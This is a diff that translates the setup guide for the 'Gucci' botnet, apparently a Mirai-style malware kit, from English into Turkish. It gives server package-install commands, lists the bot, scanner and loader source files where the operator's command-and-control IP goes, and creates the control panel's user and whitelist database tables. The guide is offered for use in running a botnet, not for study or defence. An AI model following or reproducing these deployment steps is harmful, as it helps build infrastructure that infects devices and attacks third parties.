@@ -1,8 +1,8 @@
 ==========================================================
-				         GUCCI BOTNET SETUP
+				         GUCCI BOTNET KURULUMU
 ==========================================================
 
-// Copy paste this code and put it all on your terminal all at once:
+// '//' Sonuna kadar kopyala ve terminal'a yapıştır :
 
 yum update -y
 yum install epel-release -y
@@ -61,15 +61,16 @@ go env
 cd ~/
 
 
-// Change all the ips into your botnet ip
- CHANGE IP(s)
- scanListen.go (line 14)
- loader/src/main.c (line 33)
+// IP DEGISTIR
+ IP LERI DEGISTIR
+ scanListen.go (line 14) //
+ loader/src/main.c (line 33) //
  loader/src/headers/config.h (line 3, 6)
- dlr/main.c (line 8)
- bot/main.c (line 365)
- bot/scanner.c (line 891)
+ dlr/main.c (line 8)      //
+ bot/main.c (line 365)   //
+ bot/scanner.c (line 891) //
 
+            ///////////////////////////////// Bu yazan lokasyonlara gidip kendi ip nizi yazn pls
 
 // We will setup the database, run these commands on your terminal:
 
@@ -123,8 +124,8 @@ CREATE TABLE `whitelist` (
   KEY `prefix` (`prefix`)
 );
 INSERT INTO users VALUES (NULL, 'USER', 'PASS', 0, 0, 0, 0, -1, 1, 30, '');
-								^^^^^^^ ^^^^^^
-				!Change user and pass to your login credentials!
+				^^^^^^^ ^^^^^^
+				!Bu bölüm giriş yaparken lazım olacak!
 
 CREATE TABLE `logins` (
   `id` int(11) NOT NULL,
